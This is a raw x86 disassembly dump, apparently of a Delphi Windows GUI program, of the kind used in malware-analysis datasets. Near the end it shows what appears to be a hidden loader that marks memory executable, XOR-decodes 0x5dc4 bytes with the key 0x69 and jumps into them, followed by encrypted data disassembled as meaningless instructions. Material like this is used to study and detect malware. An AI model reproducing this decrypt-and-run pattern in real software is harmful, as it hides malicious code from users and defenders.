mov edx esi
mov eax [ ebx + 0x160 ]
call sub_424ea8
sub_483998
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x16c ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax esi
call sub_47b214
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_4170c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425028
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
add [ ebp - 0x14 ] 0x2
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_47f1d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
push 0x1
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
add edx 0x3
mov eax [ ebx ]
add eax 0x6
call sub_417088
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx 0x2
call sub_46b4ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_4170c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424e6c
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425028
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx 0x12
mov edx 0x1
mov eax 0x1
call sub_4170c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424e6c
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425028
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
push 0x1
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4c ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b214
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_4191a8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479bf4
pop edx
call sub_47a4d4
cmp [ eax + 0x30 ] 0x0
je r-xdata
dec edx
mov eax [ ebp - 0x28 ]
add eax 0x5
call sub_417088
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx 0x2
call sub_46b4ec
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_483d27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_424a38
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov ebx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x38 ]
mov ecx [ ebp - 0x18 ]
call sub_456bd8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_424a38
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0x2
push eax
mov eax [ ebp - 0x14 ]
add eax 0x3
push eax
push 0x0
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a6c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425280
push eax
call DrawStateA
sub_483e8c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424bd0
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424b88
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_483fe7
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
call sub_424e6c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44894c
push 0x1
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawEdge
push 0x4
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawEdge
mov eax esi
call sub_47b8c0
test al al
je r-xdata
mov eax [ ebx + 0x160 ]
mov edx 0x20
call sub_424f44
mov eax ebx
call sub_4489f4
sar eax 0x1
jns r-xdata
adc ecx 0x0
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
push eax
mov eax ebx
call sub_4489b0
mov edx eax
mov eax [ ebx + 0x160 ]
pop ecx
call sub_424ee4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483fee
mov eax [ ebp - 0x8 ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_403128
retn
adc eax 0x0
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424b54
jmp r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424758
mov eax ebx
call sub_4489f4
mov ecx eax
sar ecx 0x1
jns r-xdata
sub_483ff4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_404368
xor eax eax
push ebp
push j_sub_4038bc#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_403f50
mov edi [ ebx + 0x30 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403f50
push 0x0
push 0x6
push esi
call OffsetRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4044bc
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_475314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484103
lea eax [ ebp - 0x8 ]
call sub_403eb8
lea eax [ ebp + 0x8 ]
call sub_403eb8
retn
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4044bc
mov edx eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
call sub_404418
sub_48410f
inc [ ecx ]
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425028
mov edx esi
mov eax ebx
call sub_46d324
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
sub_4841cc
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038bc#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4841f8
retn
sub_4842c4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
call sub_479bb4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ r-xdata ]
jmp r-xdata
mov eax esi
call sub_47b0a8
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ r-xdata ]
jmp r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ r-xdata ]
jmp r-xdata
mov eax esi
call sub_47b0a8
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ r-xdata ]
mov eax [ r-xdata ]
jmp r-xdata
mov eax [ r-xdata ]
jmp r-xdata
mov eax esi
call sub_479bd4
mov edx [ ebx + 0x2c4 ]
cmp eax [ edx + 0x31c ]
je r-xdata
mov eax [ r-xdata ]
pop esi
pop ebx
retn
mov eax [ r-xdata ]
jmp r-xdata
sub_4843b4
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_4032b4
test al al
je r-xdata
mov eax [ r-xdata ]
pop ebx
retn
mov eax [ r-xdata ]
pop ebx
retn
sub_484405
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_4038bc#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48444a
mov eax [ rw-data ]
call sub_475d18
mov eax [ rw-data ]
call sub_403128
sub_48444c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push j_sub_4038bc#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4844ba
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_403f0c
mov eax [ rw-data ]
call sub_475c84
sub_4844c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_488d1b
inc esi
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20004846 ] dh
add eax [ eax ]
add [ ecx + esi * 8 + 0x45 ] ah
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ ecx + 0x21d80046 ] bl
inc esi
add ah ah
and al [ esi ]
xchg esp eax
lea eax [ eax + eax - 0x2c ]
adc al 0x42
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add [ esp + ebx ] dh
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ edi + edi ] al
inc esi
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
or al [ eax ]
mov bh 0x46
dec eax
add al bh
add al [ eax ]
add [ eax ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x2fc31
add [ ecx ] al
add [ esi ] al
push eax
popad
outsb
insb
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ ebx ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or al 0x52
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
pop es
inc edx
jne r-xdata
add [ ebx + ebp * 8 ] dh
inc ebx
add [ edx + ecx * 4 - 0x230fffbb ] cl
inc ebx
add [ esp + edx * 8 + 0x43 ] dl
je r-xdata
loopne r-xdata
xor [ eax * 2 - 0xd53ffb8 ] ecx
inc ebp
add [ esi ] bl
add al 0xf2
inc ebx
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x6f500a00
jo r-xdata
mov esp ebp
pop ebp
retn
pop ebx
inc edx
mov [ ebp - 0xc ] 0x0
add [ eax + 0x10004375 ] al
popad
inc edi
add [ ebp + 0x46e80040 ] cl
dec eax
add [ edi ] al
jo r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
nop
xor esi esi
nop
nop
add esi [ ebp - 0x4 ]
nop
nop
add esi [ ebp - 0x8 ]
mov al [ esi ]
xor al 0x69
mov [ esi ] al
nop
inc [ ebp - 0xc ]
dec edx
jne r-xdata
inc esi
outsd
jb r-xdata
outsb
jne r-xdata
push 0x0
push 0x0
call GetMenuState
mov edx ebx
test edx edx
jb r-xdata
shr [ edx ] 0x1
xor [ edx ] ecx
add [ eax + 0x4b ] bl
inc ebp
add ah cl
and [ ebx ] al
pushad
sub eax [ ebx ]
xor [ ebx + eax ] ebx
add [ eax ] al
or [ eax ] eax
push cs
adc [ ebx ] al
add [ eax ] al
push es
add [ 0x74696445 ] al
xor [ ebx + eax ] edx
add [ eax ] al
pop es
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ebx
add eax [ eax ]
add [ eax ] cl
add [ edx ] dl
dec edi
jo r-xdata
push es
push esp
inc esi
outsd
jb r-xdata
lea eax [ eax ]
call 0x7488f2f
push es
push esp
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
nop
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5dc4
mov eax [ ebp - 0x4 ]
push eax
push 0xffffffff
call ecx
push 0x0
inc ebp
dec eax
add [ edx + esi * 8 + 0x5e0045 ] ch
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
outsb
popad
jb r-xdata
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x1c31676f
add eax [ eax ]
add [ ecx ] cl
add [ esi ] cl
sub_484704
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
nop
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5dc4
mov eax [ ebp - 0x4 ]
push eax
push 0xffffffff
call ecx
push 0x0
push 0x0
push 0x0
call GetMenuState
mov edx ebx
test edx edx
jb r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
nop
xor esi esi
nop
nop
add esi [ ebp - 0x4 ]
nop
nop
add esi [ ebp - 0x8 ]
mov al [ esi ]
xor al 0x69
mov [ esi ] al
nop
inc [ ebp - 0xc ]
dec edx
jne r-xdata
sub_484764
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
nop
nop
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
nop
test ebx ebx
je r-xdata
push r-xdata
call sub_484764
stc
stc
stc
xchg esi eax
sbb al 0x79
xor al 0x65
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
0x3a698d0c 0xd10f
nop
nop
mov ecx r-xdata
mov edx 0x5dc4
mov eax ebx
call sub_484704
nop
nop
add ebx 0xd64
jae r-xdata
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
call sub_403068
sub_4849d0
push ds
pavgb mm5 [ ecx * 4 + 0x696b5f80 ]
imul edi ecx 0xf9f9f9f9
xor [ ebx ] al
push cs
pavgb mm4 [ ebx + esi * 4 ]
xor [ ebx ] al
inc edi
pavgb mm4 [ esi * 4 + 0x24e00f30 ]
mov bh 0xe2
mov eax [ 0xffffffff8d2ce00f ]
pop edx
test eax 0x3801103
arpl [ ecx + 0x69 ] bp
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
xor eax [ ebx ]
sub al 0x9d
cmp edx esp
sub al 0x61
scasb [ edi ]
sub al 0x9d
sbb cl [ ebx ]
add [ eax + eax * 4 ] cl
xor [ ebx ] 0x69
imul edi ecx 0xe03ef9f9
das
sbb eax 0x69727580
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
xor [ eax + 0x69694a9e ] al
loop r-xdata
mov [ ebx ] esi
pavgb mm7 [ ebx + ecx * 4 ]
sbb cl 0x40
imul ebp [ ecx - 0x7 ] 0x3f3ff9f9
add ecx [ ecx + 0x3f ]
aas
aas
xor [ edx + 0x5b ] 0x69
imul edi ecx 0x69500381
imul ebp esp 0x6aca80a9
imul ebp [ ecx - 0x7 ] 0xa9ec37f9
adc [ eax - 0x69696d3 ] 0xf9
stc
stc
cmp al 0xe2
test edx ebp
test [ ebp - 0x1c ] esp
add eax 0xb73ce00f
xor eax [ ebx ]
or al 0xf
loopne r-xdata
xor bh 0x7b
imul ebp [ ecx - 0x7 ] 0x3885e23c
cmp al [ eax + 0x6969280e ]
cmp [ ecx ] bh
xchg esi eax
sbb al 0x8d
adc bh 0x6d
imul ebp [ ecx - 0x7 ] 0x3ce00ff9
pop ecx
add edx [ eax ]
xor eax [ eax + 0x69695e50 ]
stc
add [ ebp + 0x36696951 ] 0xa9ec3237
add [ esi ] 0x4b
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
0x8e805b90 0x695e
sub_484b97
imul ebp [ ecx - 0x16 ] 0xe00f49ab
jge r-xdata
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
in al dx
test eax 0x2e5fec66
imul ebp [ ecx - 0x1c ] 0xe239912c
scasd [ edi ]
sub [ edx ] 0x30696922
in al dx
test eax 0x692e7480
imul edi ecx 0xf9f9f9f9
sub [ esi ] 0x80696929
dec ecx
outsb
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
cmp al 0xe2
test [ eax + 0x69697628 ] eax
stc
cmp [ ebx - 0x159696ae ] 0x358065ad
cmp [ ecx + 0x69 ] ch
stc
stc
stc
stc
stc
xor [ ebx ] eax
or al 0xf
loopne r-xdata
das
push edx
cdq
jmp r-xdata
aaa
xor ah [ eax - 0x6060656 ]
pop [ eax + 0x69697ab8 ]
stc
stc
cmp [ eax + 0x69697a0e ] al
stc
stc
stc
stc
stc
stc
stc
stc
stc
jmp r-xdata
xchg esp eax
xchg esi eax
xchg esi eax
cmp edx esp
sahf
xor eax 0xea696920
lodsd [ esi ]
jns r-xdata
stc
stc
stc
stc
stc
pavgb mm7 [ ecx + 0xf ]
in al dx
mov ebx 0x69399c80
imul edi ecx 0x3885e23c
cmp [ esi ] bh
pop edx
xchg esi eax
sub [ esi - 0x69696c3 ] 0x3a
aas
pop edx
mov dl 0x80
retn
imul ebx [ edx - 0x57 ] 0xa0323736
stosb [ edi ]
stc
stc
stc
push eax
pop esi
imul ebp [ ecx - 0x7 ] 0x69518581
imul esi [ esi ] 0xa9ec3237
add [ esi ] 0x4b
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
0x8e805b90 0x695e
jae r-xdata
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
stc
cmp al 0xe4
add eax 0x85e8e54d
int1
imul ebp [ ecx + 0x69 ] 0x33e3f3a
sbb [ eax + 0x69693a3a ] eax
stc
stc
stc
xchg esi eax
sub_484ba6
xchg esi eax
xchg esi eax
xchg esi eax
aaa
stosb [ edi ]
pavgb mm4 [ ebx * 4 + 0x3310c03 ]
add eax 0x69630a80
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
in al dx
test eax 0x2e5fec66
imul ebp [ ecx - 0x1c ] 0xe239912c
scasd [ edi ]
sub [ edx ] 0x30696922
in al dx
test eax 0x692e7480
imul edi ecx 0xf9f9f9f9
sub [ esi ] 0x80696929
dec ecx
outsb
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
cmp al 0xe2
test [ eax + 0x69697628 ] eax
stc
cmp [ ebx - 0x159696ae ] 0x358065ad
cmp [ ecx + 0x69 ] ch
stc
stc
stc
stc
stc
xor [ ebx ] eax
or al 0xf
loopne r-xdata
aaa
xor ah [ eax - 0x6060656 ]
pop [ eax + 0x69697ab8 ]
stc
stc
cmp [ eax + 0x69697a0e ] al
stc
stc
stc
stc
stc
stc
stc
stc
stc
jmp r-xdata
stc
stc
stc
stc
stc
pavgb mm7 [ ecx + 0xf ]
in al dx
mov ebx 0x69399c80
imul edi ecx 0x3885e23c
cmp [ esi ] bh
pop edx
xchg esi eax
sub [ esi - 0x69696c3 ] 0x3a
aas
pop edx
mov dl 0x80
retn
imul ebx [ edx - 0x57 ] 0xa0323736
stosb [ edi ]
stc
stc
stc
sub_484c3d
imul ebp [ ecx + 0x5a ] 0x323736a9
mov al [ 0xfffffffff9f9f9aa ]
stc
stc
stc
stc
stc
pavgb mm7 [ ecx + 0xf ]
in al dx
mov ebx 0x69399c80
